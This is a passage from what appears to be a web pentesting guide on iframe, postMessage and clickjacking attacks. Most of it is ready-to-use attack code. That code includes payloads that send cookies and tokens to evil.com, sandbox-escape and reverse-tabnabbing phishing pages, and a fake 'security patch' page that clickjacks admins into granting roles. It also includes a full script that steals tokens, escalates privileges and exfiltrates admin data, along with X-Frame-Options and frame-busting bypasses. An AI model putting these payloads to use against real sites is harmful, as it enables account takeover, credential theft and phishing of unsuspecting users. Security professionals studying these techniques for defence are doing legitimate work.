    logDiv.prepend(entry);
    
    console.log('[+] postMessage intercepted:', {
      origin: event.origin,
      data: event.data,
      source: event.source
    });

    // Exfiltrate intercepted messages
    navigator.sendBeacon('https://evil.com/postmsg', JSON.stringify({
      origin: event.origin,
      data: event.data,
      timestamp: Date.now(),
      target_url: location.href
    }));
  }, false);

  // Also try to send messages TO the target iframe
  const targetFrame = document.getElementById('target');
  targetFrame.onload = function() {
    // Try sending messages the target might accept
    const payloads = [
      { type: 'auth', token: 'attacker_token_here' },
      { action: 'redirect', url: 'https://evil.com/phish' },
      { cmd: 'eval', code: 'alert(document.domain)' },
      { type: 'config', debug: true, admin: true },
      'javascript:alert(1)',
      '<img src=x onerror=alert(1)>'
    ];
    
    payloads.forEach(function(payload, i) {
      setTimeout(function() {
        targetFrame.contentWindow.postMessage(payload, '*');
        console.log('[*] Sent payload:', payload);
      }, i * 500);
    });
  };
  </script>

  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Origin Bypass"}
  ```javascript [postmessage-origin-bypass.js]
  // Common vulnerable postMessage handlers and how to exploit them

  // ═══ VULNERABLE PATTERN 1: No origin check ═══
  // Target code:
  // window.addEventListener('message', function(e) {
  //   document.getElementById('output').innerHTML = e.data;
  // });
  //
  // Attack: Send XSS via postMessage
  // targetWindow.postMessage('<img src=x onerror=alert(1)>', '*');

  // ═══ VULNERABLE PATTERN 2: Weak origin check ═══
  // Target code:
  // window.addEventListener('message', function(e) {
  //   if (e.origin.indexOf('trusted.com') > -1) {
  //     eval(e.data.code);
  //   }
  // });
  //
  // Bypass: Register domain like "trusted.com.evil.com"
  // or "evil-trusted.com" — indexOf matches substring!

  // ═══ VULNERABLE PATTERN 3: Regex bypass ═══
  // Target code:
  // if (e.origin.match(/trusted\.com/)) { ... }
  //
  // Bypass: "trustedXcom.evil.com" — dot matches any char in regex

  // ═══ VULNERABLE PATTERN 4: Protocol downgrade ═══
  // Target code:
  // if (e.origin === 'https://trusted.com') { ... }
  //
  // If target also works on http:// → MitM inject postMessage

  // ═══ EXPLOITATION SCRIPT ═══
  // Host this on attacker page that frames the target:

  (function() {
    const target = document.getElementById('victim-iframe').contentWindow;
    
    // XSS via innerHTML sink
    target.postMessage(
      '<img src=x onerror="fetch(\'https://evil.com/steal?c=\'+document.cookie)">', 
      '*'
    );
    
    // Code execution via eval sink
    target.postMessage({
      type: 'update',
      code: 'fetch("https://evil.com/steal?c="+document.cookie)'
    }, '*');
    
    // Redirect via location sink
    target.postMessage({
      action: 'navigate',
      url: 'https://evil.com/phishing-page'
    }, '*');
    
    // Config override
    target.postMessage({
      type: 'config',
      apiUrl: 'https://evil.com/fake-api',
      debugMode: true,
      isAdmin: true
    }, '*');
  })();
  ```
  :::

  :::tabs-item{icon="i-lucide-info" label="Finding Vulnerable Handlers"}
  ```javascript [find-postmessage-handlers.js]
  // Run in browser console on target page to find postMessage handlers

  (function() {
    console.log('=== postMessage Handler Analysis ===\n');
    
    // Method 1: Check for addEventListener('message', ...)
    const original = EventTarget.prototype.addEventListener;
    const handlers = [];
    
    // Monkey-patch to log all message listeners
    EventTarget.prototype.addEventListener = function(type, handler, options) {
      if (type === 'message') {
        handlers.push({
          target: this,
          handler: handler.toString().substring(0, 500),
          stack: new Error().stack
        });
        console.log('[+] postMessage handler registered:');
        console.log('    Handler:', handler.toString().substring(0, 200));
        console.log('    Stack:', new Error().stack.split('\n')[2]);
      }
      return original.call(this, type, handler, options);
    };

    // Method 2: Search for onmessage assignments
    if (window.onmessage) {
      console.log('[+] window.onmessage is set:');
      console.log('    Handler:', window.onmessage.toString().substring(0, 500));
    }

    // Method 3: Search all scripts for postMessage patterns
    const scripts = document.querySelectorAll('script');
    scripts.forEach((script, i) => {
      const content = script.textContent || '';
      
      const patterns = [
        /addEventListener\s*\(\s*['"]message['"]/g,
        /onmessage\s*=/g,
        /\.postMessage\s*\(/g,
        /e\.origin|event\.origin|msg\.origin/g,
        /e\.data|event\.data|msg\.data/g,
        /e\.source|event\.source/g
      ];
      
      patterns.forEach(pattern => {
        const matches = content.match(pattern);
        if (matches) {
          console.log(`[+] Script ${i}: Found ${matches.length}x "${pattern.source}"`);
          
          // Extract context around the match
          let idx = content.search(pattern);
          if (idx > -1) {
            const context = content.substring(
              Math.max(0, idx - 100), 
              Math.min(content.length, idx + 300)
            );
            console.log('    Context:', context.replace(/\s+/g, ' ').trim());
          }
        }
      });
    });

    // Method 4: Check for origin validation
    console.log('\n=== Origin Validation Check ===');
    scripts.forEach((script, i) => {
      const content = script.textContent || '';
      if (content.includes('message') && content.includes('origin')) {
        // Check validation quality
        if (content.match(/indexOf\s*\(\s*['"][^'"]+['"]\s*\)/)) {
          console.log(`[!] Script ${i}: WEAK origin check (indexOf) — BYPASSABLE`);
        }
        if (content.match(/\.match\s*\(\s*\/[^\/]+\/\s*\)/)) {
          console.log(`[!] Script ${i}: REGEX origin check — check for bypass`);
        }
        if (content.match(/===\s*['"]https?:\/\/[^'"]+['"]/)) {
          console.log(`[*] Script ${i}: Strict equality origin check`);
        }
        if (!content.match(/origin/i)) {
          console.log(`[!] Script ${i}: NO origin check detected — VULNERABLE`);
        }
      }
    });

    console.log('\n=== Registered Handlers ===');
    console.log(handlers);
  })();
  ```
  :::
::

---

## Sandbox Escape & Bypass

### Iframe Sandbox Bypass Techniques

::tabs
  :::tabs-item{icon="i-lucide-code" label="Sandbox Attribute Values"}
  ```html [sandbox-attributes.html]
  <!-- Sandbox attribute restricts iframe capabilities -->
  <!-- Understanding what each value allows is crucial for exploitation -->

  <!-- MOST RESTRICTIVE — empty sandbox -->
  <iframe sandbox src="page.html">
  <!-- Blocks: scripts, forms, popups, top navigation, plugins, everything -->

  <!-- ALLOW SCRIPTS — enables JavaScript execution -->
  <iframe sandbox="allow-scripts" src="page.html">
  <!-- Scripts run, but forms blocked, no top navigation, no popups -->

  <!-- ALLOW FORMS — enables form submission -->
  <iframe sandbox="allow-forms" src="page.html">
  <!-- Forms submit, but no scripts, no popups -->

  <!-- ALLOW SCRIPTS + SAME ORIGIN — near full access -->
  <iframe sandbox="allow-scripts allow-same-origin" src="page.html">
  <!-- ⚠ DANGEROUS: Can access parent cookies, localStorage, etc. -->
  <!-- The iframe can REMOVE ITS OWN SANDBOX ATTRIBUTE! -->

  <!-- ALLOW TOP NAVIGATION — can redirect parent page -->
  <iframe sandbox="allow-top-navigation" src="page.html">
  <!-- Iframe can set top.location → redirect parent to phishing -->

  <!-- ALLOW POPUPS — can open new windows -->
  <iframe sandbox="allow-popups" src="page.html">
  <!-- window.open works — new window has NO sandbox! -->

  <!-- ALLOW POPUPS + NO POPUP SANDBOX — popups inherit no restrictions -->
  <iframe sandbox="allow-popups allow-popups-to-escape-sandbox" src="page.html">
  <!-- ⚠ Opened windows have ZERO sandbox restrictions -->

  <!-- ALLOW MODALS — alert/confirm/prompt/print work -->
  <iframe sandbox="allow-modals" src="page.html">
  <!-- Can show alerts — useful for XSS PoC -->

  <!-- Common misconfiguration — too many permissions -->
  <iframe sandbox="allow-scripts allow-same-origin allow-forms allow-popups 
                   allow-top-navigation allow-modals" src="page.html">
  <!-- This sandbox provides almost NO protection -->
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Sandbox Escape Payloads"}
  ```html [sandbox-escape-payloads.html]
  <!-- ═══ ESCAPE 1: allow-scripts + allow-same-origin ═══ -->
  <!-- The iframe can remove its own sandbox! -->
  <script>
    // Remove sandbox attribute from parent's reference to this iframe
    var frame = window.frameElement;
    if (frame) {
      frame.removeAttribute('sandbox');
      // Now reload without sandbox restrictions
      location.reload();
    }
    
    // Alternative: remove from parent DOM
    if (window.parent && window.parent.document) {
      var iframes = window.parent.document.querySelectorAll('iframe');
      iframes.forEach(function(f) {
        if (f.contentWindow === window) {
          f.removeAttribute('sandbox');
          f.src = f.src; // Reload
        }
      });
    }
  </script>

  <!-- ═══ ESCAPE 2: allow-popups (+ allow-popups-to-escape-sandbox) ═══ -->
  <!-- Open a new window — it has NO sandbox! -->
  <script>
    // New window is unrestricted
    var win = window.open('https://target.com/sensitive-page');
    // win has full access, no sandbox restrictions
    
    // Or open with javascript: URI
    var win2 = window.open('javascript:alert(document.domain)');
    
    // Open data: URI
    var win3 = window.open('data:text/html,<script>alert(document.cookie)<\/script>');
  </script>

  <!-- ═══ ESCAPE 3: allow-top-navigation ═══ -->
  <!-- Navigate the parent page -->
  <script>
    // Redirect parent to phishing page
    top.location = 'https://evil.com/fake-login.html';
    
    // Or use javascript: URI (if allowed)
    top.location = 'javascript:alert(document.domain)';
  </script>

  <!-- ═══ ESCAPE 4: allow-forms (no scripts) ═══ -->
  <!-- Use form actions for navigation/exploitation -->
  <form action="https://evil.com/steal" method="POST" id="exfil">
    <!-- Steal data via hidden form fields -->
    <input type="hidden" name="page_url" value="">
  </form>
  <script>
    // If scripts are also allowed:
    document.getElementById('exfil').elements[0].value = parent.location.href;
    document.getElementById('exfil').submit();
  </script>

  <!-- Without scripts: use target="_top" to redirect parent -->
  <form action="https://evil.com/phish" method="GET" target="_top">
    <input type="submit" value="Click here for a surprise!">
  </form>

  <!-- ═══ ESCAPE 5: allow-scripts without allow-same-origin ═══ -->
  <!-- Can execute JS but unique origin — can't access parent DOM -->
  <!-- But can still: -->
  <script>
    // Exfiltrate via image beacon
    new Image().src = 'https://evil.com/ping?framed=true&ref=' + document.referrer;
    
    // postMessage to parent (if parent listens)
    parent.postMessage('malicious_data', '*');
    
    // Crypto mining
    // importScripts('https://evil.com/miner.js');
  </script>
  ```
  :::

  :::tabs-item{icon="i-lucide-info" label="Sandbox Escape Matrix"}
  ```text [sandbox-escape-matrix.txt]
  SANDBOX PERMISSIONS vs ATTACK CAPABILITIES:
  ════════════════════════════════════════════
  
  ┌───────────────────────────┬─────┬──────┬──────┬──────┬───────┐
  │ Capability                │  ∅  │  AS  │ ASO  │  AT  │ AP    │
  │                           │empty│script│+orig │top-n │popup  │
  ├───────────────────────────┼─────┼──────┼──────┼──────┼───────┤
  │ Execute JavaScript        │  ✗  │  ✓   │  ✓   │  ✗   │  ✗   │
  │ Access parent DOM         │  ✗  │  ✗   │  ✓   │  ✗   │  ✗   │
  │ Read parent cookies       │  ✗  │  ✗   │  ✓   │  ✗   │  ✗   │
  │ Submit forms              │  ✗  │  ✗   │  ✗   │  ✗   │  ✗   │
  │ Navigate parent page      │  ✗  │  ✗   │  ✗   │  ✓   │  ✗   │
  │ Open popups               │  ✗  │  ✗   │  ✗   │  ✗   │  ✓   │
  │ Remove own sandbox        │  ✗  │  ✗   │  ✓!  │  ✗   │  ✗   │
  │ postMessage to parent     │  ✗  │  ✓   │  ✓   │  ✗   │  ✗   │
  │ Exfiltrate via beacon     │  ✗  │  ✓   │  ✓   │  ✗   │  ✗   │
  │ Redirect to phishing      │  ✗  │  ✗   │  ✗   │  ✓   │  ✗   │
  │ Popup without sandbox     │  ✗  │  ✗   │  ✗   │  ✗   │  ✓!  │
  └───────────────────────────┴─────┴──────┴──────┴──────┴───────┘
  
  Legend:
  ∅    = sandbox (empty/no values)
  AS   = allow-scripts
  ASO  = allow-scripts allow-same-origin
  AT   = allow-top-navigation  
  AP   = allow-popups
  ✓!   = Critical escape vector
  
  DANGEROUS COMBINATIONS:
  ─────────────────────────
  allow-scripts + allow-same-origin = CAN REMOVE OWN SANDBOX
  allow-popups + allow-popups-to-escape-sandbox = UNRESTRICTED POPUP
  allow-top-navigation + allow-scripts = PHISHING REDIRECT
  allow-forms + allow-top-navigation = FORM-BASED REDIRECT
  ```
  :::
::

---

## Frame Injection Attacks

### Iframe Injection via Parameter Manipulation

::tabs
  :::tabs-item{icon="i-lucide-code" label="URL Parameter Injection"}
  ```text [iframe-param-injection.txt]
  IFRAME INJECTION VIA URL PARAMETERS:
  ════════════════════════════════════
  
  Scenario: Application uses URL parameter for iframe src
  Vulnerable code: <iframe src="<?= $_GET['url'] ?>">
  
  ── BASIC INJECTION ──
  https://target.com/embed?url=https://evil.com/phishing
  
  ── JAVASCRIPT URI ──
  https://target.com/embed?url=javascript:alert(document.domain)
  
  ── DATA URI ──
  https://target.com/embed?url=data:text/html,<script>alert(1)</script>
  https://target.com/embed?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
  
  ── BREAK OUT OF IFRAME TAG ──
  https://target.com/embed?url="><script>alert(1)</script>
  https://target.com/embed?url=" onload="alert(1)
  https://target.com/embed?url=https://evil.com" onload="alert(1)
  
  ── SRCDOC INJECTION (if srcdoc attribute is injectable) ──
  https://target.com/embed?content=<script>alert(1)</script>
  → <iframe srcdoc="<script>alert(1)</script>">
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="HTML Injection → Iframe"}
  ```html [html-injection-iframe.html]
  <!-- When you have HTML injection but not full XSS,
       inject an iframe for phishing or clickjacking -->

  <!-- Inject phishing login form via iframe -->
  <iframe src="https://evil.com/fake-login" 
    style="position:fixed;top:0;left:0;width:100%;height:100%;
           border:none;z-index:99999;" 
    allowtransparency="true">
  </iframe>

  <!-- Inject iframe that loads XSS payload -->
  <iframe src="javascript:alert(document.domain)" 
    style="width:0;height:0;border:none;">
  </iframe>

  <!-- Inject iframe with data URI -->
  <iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+" 
    style="display:none;">
  </iframe>

  <!-- Inject srcdoc iframe (inline HTML, same origin!) -->
  <iframe srcdoc="<script>
    fetch('/api/me',{credentials:'include'})
    .then(r=>r.text())
    .then(d=>fetch('https://evil.com/steal?d='+btoa(d)))
  </script>" style="display:none;">
  </iframe>

  <!-- Inject invisible iframe for session riding -->
  <iframe src="https://target.com/transfer?to=attacker&amount=10000" 
    style="width:1px;height:1px;position:absolute;left:-9999px;">
  </iframe>
  ```
  :::
::

### Reverse Tabnabbing

::tabs
  :::tabs-item{icon="i-lucide-code" label="Tabnabbing Attack"}
  ```html [reverse-tabnabbing.html]
  <!-- REVERSE TABNABBING -->
  <!-- When target opens attacker's page in a new tab,
       attacker can modify the OPENER's URL -->

  <!-- Vulnerable link on target site (no rel="noopener") -->
  <!-- <a href="https://evil.com" target="_blank">Visit Partner</a> -->

  <!-- Attacker's page (evil.com) -->
  <!DOCTYPE html>
  <html>
  <head><title>Interesting Article</title></head>
  <body>
    <h1>Welcome! Loading content...</h1>
    
    <script>
      // Check if we have access to the opener
      if (window.opener) {
        // Redirect the original tab to a phishing page!
        // User doesn't notice because they're looking at THIS tab
        window.opener.location = 'https://evil.com/fake-login.html';
        
        // When user switches back to original tab,
        // they see a "Session expired, please login again" page
        // and enter their credentials into the phishing page
      }
    </script>
    
    <p>Interesting content that keeps the user engaged 
       on this tab while the original tab gets replaced...</p>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Enhanced Tabnabbing"}
  ```html [enhanced-tabnabbing.html]
  <!DOCTYPE html>
  <html>
  <head><title>Loading...</title></head>
  <body>
  <script>
  // Enhanced reverse tabnabbing with timing

  if (window.opener) {
    const targetOrigin = new URL(document.referrer || '').origin;
    
    // Wait for user to engage with this page
    setTimeout(function() {
      // Step 1: Redirect opener to identical-looking phishing page
      window.opener.location = 'https://evil.com/clone/' + 
        encodeURIComponent(targetOrigin);
      
    }, 3000); // Wait 3 seconds — user is focused on new tab

    // Step 2: After more time, show "return" prompt
    setTimeout(function() {
      document.body.innerHTML = `
        <div style="text-align:center;padding:100px;font-family:sans-serif;">
          <h2>Content has moved!</h2>
          <p>Please return to the previous tab to continue.</p>
          <button onclick="window.close()" 
            style="padding:10px 30px;font-size:16px;cursor:pointer;">
            ← Go Back
          </button>
        </div>
      `;
    }, 8000); // Prompt user to go back to the now-phished tab
  }
  </script>

  <h1>Loading article...</h1>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-info" label="Tabnabbing Flow"}
  ```text [tabnabbing-flow.txt]
  REVERSE TABNABBING ATTACK FLOW:
  ═══════════════════════════════
  
  1. User is on legitimate-site.com (TAB A)
  2. User clicks link to evil.com (opens TAB B)
     Link: <a href="evil.com" target="_blank">
     Missing: rel="noopener noreferrer"
  
  3. TAB B (evil.com) executes:
     window.opener.location = 'https://evil.com/fake-login'
  
  4. TAB A (was legitimate-site.com) → NOW shows evil.com/fake-login
     User doesn't see this change (they're looking at TAB B)
  
  5. evil.com/fake-login is a PERFECT CLONE of legitimate-site.com
     Shows: "Your session has expired. Please log in again."
  
  6. User switches back to TAB A
     Sees the fake login page (thinks they were logged out)
     Enters credentials → sent to attacker
  
  7. Attacker gets credentials AND redirects to real site
     User logs in normally → thinks nothing happened
  
  PREREQUISITES:
  ├── Target site has links with target="_blank"
  ├── Missing rel="noopener" attribute
  ├── User clicks the link (social engineering)
  └── Attacker can host a convincing clone page
  
  ALSO WORKS WITH:
  ├── window.open() without 'noopener' feature
  ├── Some PDF viewers in browsers
  ├── <form target="_blank"> submissions
  └── <base target="_blank"> on the page
  ```
  :::
::

---

## Privilege Escalation via Iframe Manipulation

::caution
Iframe manipulation enables privilege escalation by making **admin users perform actions** through clickjacking, or by **extracting sensitive data** from framed pages via postMessage exploitation.
::

### PrivEsc — Admin Clickjacking

::tabs
  :::tabs-item{icon="i-lucide-code" label="Admin Role Grant via Clickjack"}
  ```html [privesc-admin-clickjack.html]
  <!DOCTYPE html>
  <html>
  <head>
    <title>Urgent Security Update Required</title>
    <style>
      body {
        margin: 0;
        font-family: -apple-system, sans-serif;
        background: #f8d7da;
        padding: 40px;
      }

      .alert-box {
        max-width: 600px;
        margin: 0 auto;
        background: white;
        border-left: 4px solid #dc3545;
        padding: 30px;
        border-radius: 4px;
        box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        position: relative;
      }

      .update-btn {
        display: inline-block;
        padding: 15px 40px;
        background: #dc3545;
        color: white;
        font-size: 16px;
        border: none;
        border-radius: 4px;
        cursor: pointer;
        margin-top: 20px;
      }

      /* Invisible iframe positioned exactly over the update button */
      .frame-wrapper {
        position: absolute;
        top: 160px;       /* Adjust to button position */
        left: 30px;
        width: 250px;
        height: 60px;
        overflow: hidden;
        z-index: 99999;
        opacity: 0.0001;
      }

      .frame-wrapper iframe {
        position: absolute;
        /* Scroll iframe to show only the "Make Admin" / "Save" button */
        top: -420px;
        left: -200px;
        width: 900px;
        height: 700px;
        border: none;
      }
    </style>
  </head>
  <body>

    <div class="alert-box">
      <h2>⚠️ Critical Security Update</h2>
      <p>A critical security vulnerability has been detected in your admin panel. 
         Immediate action is required to protect your system.</p>
      <p><strong>Your admin session will expire in 2 minutes.</strong></p>
      
      <button class="update-btn">Apply Security Patch →</button>
      
      <p style="color:#666;font-size:12px;margin-top:15px;">
        This patch addresses CVE-2024-XXXXX and requires one click to apply.
      </p>

      <!-- Hidden iframe: admin user management page -->
      <!-- Pre-filled URL to grant admin role to attacker's account -->
      <div class="frame-wrapper">
        <iframe src="https://target.com/admin/users/12345/edit?role=admin&save=true">
        </iframe>
      </div>
    </div>

  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-info" label="PrivEsc Attack Chains"}
  ```text [privesc-chains.txt]
  IFRAME MANIPULATION PRIVILEGE ESCALATION CHAINS:
  ═════════════════════════════════════════════════
  
  CHAIN 1: Clickjack Admin → Grant Attacker Admin Role
  ──────────────────────────────────────────────────────
  1. Find admin user management page (frameable)
  2. Pre-fill URL: /admin/users/ATTACKER_ID/edit?role=admin
  3. Create clickjacking page targeting the "Save" button
  4. Send to admin via email/chat (looks like security alert)
  5. Admin clicks → attacker becomes admin
  
  CHAIN 2: Clickjack Admin → Disable Security Controls
  ──────────────────────────────────────────────────────
  1. Find settings page that's frameable (/admin/settings/security)
  2. Target: "Disable 2FA" or "Disable IP whitelist" button
  3. Clickjack admin into clicking the disable button
  4. Security controls removed → attacker can now brute-force/access
  
  CHAIN 3: Clickjack → OAuth Authorization
  ────────────────────────────────────────
  1. Target's OAuth consent screen is frameable
  2. Create decoy page with "Allow" button overlay
  3. Victim clicks → authorizes attacker's malicious OAuth app
  4. Attacker gets OAuth token → full API access to victim's data
  
  CHAIN 4: postMessage → Token Theft → API Access
  ─────────────────────────────────────────────────
  1. Target page sends auth token via postMessage (no origin check)
  2. Frame target page in attacker's page
  3. Intercept postMessage → steal auth token
  4. Use token for API access → data exfiltration
  
  CHAIN 5: Clickjack → Password Change
  ─────────────────────────────────────
  1. Target's password change page doesn't require current password
  2. Pre-fill new password in URL: /change-password?new=hacked123
  3. Clickjack victim into clicking "Save"
  4. Password changed → attacker logs in with new password
  
  CHAIN 6: Frame Injection → Session Riding
  ──────────────────────────────────────────
  1. Inject invisible iframe via HTML injection
  2. iframe src = /admin/create-user?name=backdoor&role=admin
  3. If endpoint uses GET and has no CSRF → user created
  4. Backdoor admin account established
  ```
  :::
::

### PrivEsc — Token Extraction via postMessage

::code-collapse

```html [privesc-token-extraction.html]
<!DOCTYPE html>
<html>
<head><title>Token Extraction via postMessage</title></head>
<body>

<h2>postMessage Token Theft — Privilege Escalation</h2>

<!-- 
  SCENARIO: 
  target.com uses postMessage to send auth tokens between parent and iframe.
  Vulnerable handler: no origin validation.
  
  target.com/widget.html contains:
  parent.postMessage({type: 'auth', token: 'jwt_token_here'}, '*');
  
  OR parent page sends token to iframe:
  iframe.contentWindow.postMessage({token: 'jwt'}, '*');
-->

<!-- Frame the target widget that posts tokens -->
<iframe id="target-widget" 
  src="https://target.com/widget.html" 
  style="width:1px;height:1px;position:absolute;left:-9999px;">
</iframe>

<!-- Frame the target parent page -->
<iframe id="target-parent"
  src="https://target.com/dashboard"
  style="width:1px;height:1px;position:absolute;left:-9999px;">
</iframe>

<script>
// Listen for ANY postMessage events
window.addEventListener('message', function(event) {
  console.log('[+] Message received from:', event.origin);
  console.log('[+] Data:', JSON.stringify(event.data));
  
  // Check for tokens
  const data = event.data;
  let token = null;
  
  if (typeof data === 'string') {
    // Raw token string
    if (data.match(/^eyJ/)) token = data;  // JWT
  } else if (typeof data === 'object') {
    // Token in object property
    token = data.token || data.access_token || data.auth_token || 
            data.jwt || data.session || data.apiKey || data.key;
    
    // Nested token
    if (!token && data.auth) token = data.auth.token;
    if (!token && data.user) token = data.user.token;
    if (!token && data.data) token = data.data.token;
  }
  
  if (token) {
    console.log('[!!!] TOKEN CAPTURED:', token);
    
    // Exfiltrate the token
    navigator.sendBeacon('https://evil.com/token-steal', JSON.stringify({
      token: token,
      origin: event.origin,
      full_data: data,
      timestamp: Date.now()
    }));
    
    // Immediately use the token for API access
    escalatePrivileges(token);
  }
}, false);

async function escalatePrivileges(token) {
  // Step 1: Check current user's role
  try {
    const meResp = await fetch('https://target.com/api/me', {
      headers: { 'Authorization': 'Bearer ' + token }
    });
    const me = await meResp.json();
    console.log('[+] Current user:', me);
    
    // Step 2: Attempt to escalate role
    const escalateResp = await fetch('https://target.com/api/admin/users/' + me.id, {
      method: 'PATCH',
      headers: {
        'Authorization': 'Bearer ' + token,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ role: 'admin', is_superuser: true })
    });
    
    if (escalateResp.ok) {
      console.log('[!!!] PRIVILEGE ESCALATION SUCCESSFUL!');
      navigator.sendBeacon('https://evil.com/escalated', JSON.stringify({
        user: me,
        new_role: 'admin',
        token: token
      }));
    }
    
    // Step 3: Extract sensitive data with stolen token
    const endpoints = ['/api/admin/users', '/api/admin/config', '/api/secrets'];
    for (const ep of endpoints) {
      try {
        const resp = await fetch('https://target.com' + ep, {
          headers: { 'Authorization': 'Bearer ' + token }
        });
        if (resp.ok) {
          const data = await resp.text();
          navigator.sendBeacon('https://evil.com/data', JSON.stringify({
            endpoint: ep, data: data.substring(0, 5000)
          }));
        }
      } catch(e) {}
    }
  } catch(e) {
    console.log('[-] API access failed:', e.message);
  }
}

// Also try SENDING messages to the framed pages
// to trigger them to respond with tokens
setTimeout(function() {
  const widget = document.getElementById('target-widget');
  const parent = document.getElementById('target-parent');
  
  const tokenRequests = [
    { type: 'getToken' },
    { action: 'authenticate' },
    { cmd: 'getAuth' },
    { type: 'init', requestToken: true },
    { event: 'ready' },
    'getToken',
    'authenticate'
  ];
  
  tokenRequests.forEach(function(msg) {
    try { widget.contentWindow.postMessage(msg, '*'); } catch(e) {}
    try { parent.contentWindow.postMessage(msg, '*'); } catch(e) {}
  });
}, 2000);
</script>

</body>
</html>
```

::

---

## X-Frame-Options & CSP Bypass Techniques

::tabs
  :::tabs-item{icon="i-lucide-code" label="Header Bypass Methods"}
  ```text [xfo-bypass-techniques.txt]
  X-FRAME-OPTIONS & frame-ancestors BYPASS TECHNIQUES:
  ════════════════════════════════════════════════════
  
  1. ALLOW-FROM IS DEPRECATED
     ─────────────────────────
     X-Frame-Options: ALLOW-FROM https://trusted.com
     
     Chrome and Safari IGNORE ALLOW-FROM entirely!
     If ALLOW-FROM is the only protection → frameable in Chrome/Safari
     Only Firefox partially supports it (also deprecated)
     
     Test: Open in Chrome → if frameable, ALLOW-FROM is the only defense
  
  2. DOUBLE X-FRAME-OPTIONS
     ───────────────────────
     X-Frame-Options: DENY
     X-Frame-Options: SAMEORIGIN
     
     Some proxies/CDNs add duplicate headers
     Browser behavior varies:
     ├── Chrome: Uses first header
     ├── Firefox: Blocks if ANY value says DENY
     ├── Safari: Uses first header
     └── Edge: Uses first header
     
     If first header is SAMEORIGIN → frameable from same origin
  
  3. X-FRAME-OPTIONS IN META TAG
     ────────────────────────────
     <meta http-equiv="X-Frame-Options" content="DENY">
     
     This is IGNORED by all modern browsers!
     X-Frame-Options MUST be an HTTP response header
     If only in meta tag → frameable
  
  4. CSP frame-ancestors OVERRIDE
     ────────────────────────────
     When both are present, CSP frame-ancestors takes precedence:
     
     X-Frame-Options: DENY
     Content-Security-Policy: frame-ancestors *
     
     Result: FRAMEABLE (CSP overrides XFO)
  
  5. PAGE-SPECIFIC MISSING HEADERS
     ─────────────────────────────
     Main pages protected: /home, /dashboard
     Endpoints without protection: /api/oauth/authorize
     
     Check: Every page that performs sensitive actions
     Often missed: OAuth pages, payment confirmations,
                   settings pages, email unsubscribe
  
  6. SUBDOMAIN FRAMING
     ──────────────────
     X-Frame-Options: SAMEORIGIN
     CSP: frame-ancestors 'self'
     
     If attacker controls a subdomain (via XSS, subdomain takeover):
     attacker.target.com can frame target.com
     
     Also: Some implementations of SAMEORIGIN are broken
           and check only the domain, not full origin
  
  7. CRLF INJECTION
     ───────────────
     If CRLF injection exists in response headers:
     /page%0d%0aX-Frame-Options:%20ALLOW-FROM%20https://evil.com
     
     Inject your own XFO header before the real one
  
  8. INTERNET EXPLORER SPECIFIC
     ──────────────────────────
     IE11 has various XFO parsing bugs
     Some values cause IE to ignore XFO entirely
     X-Frame-Options: DENY, SAMEORIGIN (comma-separated → ignored in IE)
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Frame-Busting JS Bypass"}
  ```html [framebusting-bypass.html]
  <!-- Many sites use JavaScript frame-busting instead of headers -->
  <!-- These can ALL be bypassed! -->

  <!-- Target's frame-busting code: -->
  <!-- if (top !== self) { top.location = self.location; } -->

  <!-- ═══ BYPASS 1: sandbox attribute ═══ -->
  <!-- sandbox blocks top navigation by default -->
  <iframe sandbox="allow-forms allow-scripts" 
    src="https://target.com/settings">
  </iframe>
  <!-- Frame-busting JS runs but can't navigate top! -->
  <!-- However, some functionality may be restricted -->

  <!-- ═══ BYPASS 2: Double framing ═══ -->
  <!-- Some frame-busters check parent, not top -->
  <!-- if (parent !== self) { parent.location = self.location; } -->
  <iframe src="data:text/html,
    <iframe src='https://target.com/settings'></iframe>">
  </iframe>
  <!-- parent is the data: URI frame, not attacker's top page -->

  <!-- ═══ BYPASS 3: onBeforeUnload cancel ═══ -->
  <iframe id="target" src="https://target.com/settings"></iframe>
  <script>
    window.onbeforeunload = function() {
      return "Do you want to leave?";
      // Browser shows dialog, user clicks "Stay"
      // Frame-buster's navigation is cancelled
    };
  </script>

  <!-- ═══ BYPASS 4: XSS Filter abuse (legacy) ═══ -->
  <!-- If browser has XSS filter, use it to block the frame-buster -->
  <iframe src="https://target.com/page?x=<script>if(top">
  </iframe>
  <!-- XSS filter blocks the frame-busting script! -->
  <!-- Only works in very old browsers with XSS Auditor -->

  <!-- ═══ BYPASS 5: Restrict scripts with CSP ═══ -->
  <meta http-equiv="Content-Security-Policy" 
    content="script-src 'none'">
  <iframe src="https://target.com/settings"></iframe>
  <!-- CSP blocks ALL JavaScript → frame-buster doesn't execute -->
  <!-- But this also breaks the target page's functionality -->

  <!-- ═══ BYPASS 6: 204 No Content ═══ -->
  <iframe id="target" src="https://target.com/settings"></iframe>
  <script>
    // When frame-buster tries to navigate top:
    // Quickly set top.location to a 204 response
    var interval = setInterval(function() {
      try {
        if (document.getElementById('target').contentWindow.location.href) {
          // Page loaded — frame-buster may have fired
        }
      } catch(e) {
        // Cross-origin — expected
      }
    }, 1);
  </script>
  ```
  :::
::

---

## Pentesting Methodology

::steps{level="4"}

#### Reconnaissance — Identify Frame Targets

```text [recon-checklist.txt]
IFRAME MANIPULATION RECON CHECKLIST:
═════════════════════════════════════

Header Analysis:
☐ Check X-Frame-Options header on ALL sensitive pages
☐ Check CSP frame-ancestors directive
☐ Check for ALLOW-FROM (deprecated/bypassable)
☐ Check for header inconsistencies across pages
☐ Check API endpoints (often missing frame protection)
☐ Check OAuth/authorization pages
☐ Check logout/account-delete/settings pages

JavaScript Analysis:
☐ Search for frame-busting JavaScript
☐ Search for postMessage handlers (addEventListener('message'))
☐ Check for origin validation in message handlers
☐ Search for window.open() calls without 'noopener'
☐ Check for links with target="_blank" without rel="noopener"
☐ Identify srcdoc usage on iframes
☐ Check sandbox attribute configurations

Sensitive Actions:
☐ Map all state-changing actions (GET and POST)
